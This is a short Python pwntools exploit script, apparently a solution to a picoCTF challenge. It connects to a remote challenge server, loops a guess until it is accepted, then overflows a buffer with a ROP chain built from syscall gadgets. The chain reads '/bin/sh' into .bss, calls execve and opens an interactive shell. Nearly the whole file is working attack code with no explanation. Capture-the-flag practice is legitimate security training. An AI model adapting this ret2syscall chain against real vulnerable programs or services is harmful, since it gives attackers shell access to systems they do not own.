from pwn import *

context.arch = "amd64"
context.terminal = ['kitty', '-e', 'sh', '-c']

vuln = ELF('Downloads/vuln')
io = remote('jupiter.challenges.picoctf.org',38467)
rop = ROP(vuln)

i = 0
io.recv()
while True:
    i += 1
    io.recv()
    io.sendline("50")
    resp = io.recv()
    if resp != 'Nope!\n':
        break

bss = vuln.bss() + 0x100
payload = 'A' * 0x78
syscall = next(vuln.search(asm('syscall ; ret')))

payload += p64(rop.rax[0])
payload += p64(0x0)
payload += p64(rop.rdi[0])
payload += p64(0x0)
payload += p64(rop.rsi[0])
payload += p64(bss)
payload += p64(rop.rdx[0])
payload += p64(0x10)
payload += p64(syscall)

payload += p64(rop.rax[0])
payload += p64(0x3b)
payload += p64(rop.rdi[0])
payload += p64(bss)
payload += p64(rop.rsi[0])
payload += p64(0x0)
payload += p64(rop.rdx[0])
payload += p64(0x0)
payload += p64(syscall)

io.recv()
io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
